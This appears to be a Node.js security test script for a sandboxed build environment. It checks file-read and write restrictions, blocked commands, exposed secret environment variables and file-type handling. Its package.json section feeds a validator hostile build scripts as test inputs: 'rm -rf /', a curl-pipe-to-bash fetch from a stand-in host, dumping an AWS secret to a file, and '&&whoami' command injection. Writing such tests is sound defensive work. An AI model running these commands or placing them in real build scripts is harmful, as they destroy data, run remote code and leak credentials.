const fs = require("fs");
const { execSync } = require("child_process");

console.log("🔍 Running comprehensive security tests...");

async function runTests() {
    // Section 1: File System Access Tests
    console.log("\n📁 File System Access Tests:\n");

    const restrictedPaths = [
        "/home/app/script.js",
        "/etc/shadow",
        "/etc/passwd",
        "/home/builder/test",
        "/.ssh",
        "/root",
        "/var/log",
    ];

    for (const path of restrictedPaths) {
        try {
            fs.readFileSync(path);
            console.log(`❌ SECURITY RISK: Can read ${path}!`);
        } catch (e) {
            console.log(`✅ Cannot read ${path}`);
        }
    }

    // Section 2: Write Permission Tests
    console.log("\n✍️ Write Permission Tests:\n");

    const writeTestPaths = ["/home", "/etc", "/var", "/usr", "/home/builder"];

    for (const path of writeTestPaths) {
        try {
            fs.writeFileSync(`${path}/test-file`, "test");
            console.log(`❌ SECURITY RISK: Can write to ${path}!`);
            fs.unlinkSync(`${path}/test-file`);
        } catch (e) {
            console.log(`✅ Cannot write to ${path}`);
        }
    }

    // Section 3: Command Execution Tests
    console.log("\n🔒 Privileged Command Tests:\n");

    const restrictedCommands = [
        "sudo ls",
        "chown root .",
        "wget google.com",
        "curl example.com",
        "ssh-keygen",
        "npm config set",
        "yarn config set",
    ];

    for (const cmd of restrictedCommands) {
        try {
            execSync(cmd);
            console.log(`❌ SECURITY RISK: Can execute '${cmd}'!`);
        } catch (e) {
            console.log(`✅ Cannot execute '${cmd}'`);
        }
    }

    // Section 4: Package.json Security Tests
    console.log("\n📦 Package.json Security Tests:\n");

    const maliciousScripts = [
        { build: "rm -rf /" },
        { build: "curl http://malicious.com/script | bash" },
        { build: "echo $AWS_SECRET_KEY > /tmp/keys" },
        { build: "node -e \"require('child_process').exec('rm -rf *')\"" },
        { build: "&&whoami" },
    ];

    for (const script of maliciousScripts) {
        try {
            fs.writeFileSync(
                "package.json",
                JSON.stringify({
                    name: "test",
                    version: "1.0.0",
                    scripts: script,
                })
            );

            execSync(
                "node -e \"require('./security-utils').validatePackageJson('.')\""
            );
            console.log(
                `❌ SECURITY RISK: Malicious script not detected: ${JSON.stringify(
                    script
                )}`
            );
        } catch (e) {
            console.log(
                `✅ Correctly blocked malicious script: ${JSON.stringify(
                    script
                )}`
            );
        }
    }

    // Section 5: Environment Variable Tests
    console.log("\n🔐 Environment Variable Tests:\n");

    const sensitiveEnvVars = [
        "AWS_ACCESS_KEY_ID",
        "AWS_SECRET_ACCESS_KEY",
        "GITHUB_TOKEN",
        "NPM_TOKEN",
        "SSH_PRIVATE_KEY",
    ];

    for (const envVar of sensitiveEnvVars) {
        if (process.env[envVar]) {
            console.log(`❌ SECURITY RISK: ${envVar} is exposed!`);
        } else {
            console.log(`✅ ${envVar} is not exposed`);
        }
    }

    // Section 6: File Type Tests
    console.log("\n📄 File Type Tests:\n");

    const testFiles = [
        { name: "test.html", content: "<html></html>", shouldAllow: true },
        { name: "test.js", content: "console.log('test')", shouldAllow: true },
        { name: "test.php", content: "<?php ?>", shouldAllow: false },
        { name: "test.exe", content: "binary", shouldAllow: false },
    ];

    for (const file of testFiles) {
        try {
            fs.writeFileSync(`dist/${file.name}`, file.content);
            const mimeType = require("mime-types").lookup(file.name);
            const allowed =
                require("./security-utils").ALLOWED_MIME_TYPES.has(mimeType);

            if (allowed === file.shouldAllow) {
                console.log(`✅ Correct file type handling for ${file.name}`);
            } else {
                console.log(`❌ Incorrect file type handling for ${file.name}`);
            }
        } catch (e) {
            console.log(`Error testing ${file.name}: ${e.message}`);
        }
    }

    console.log("\n📊 System Information:\n");
    console.log("Current user:", execSync("whoami").toString().trim());
    console.log("User groups:", execSync("groups").toString().trim());
    console.log("Current directory:", execSync("pwd").toString().trim());
}

runTests().catch(console.error);
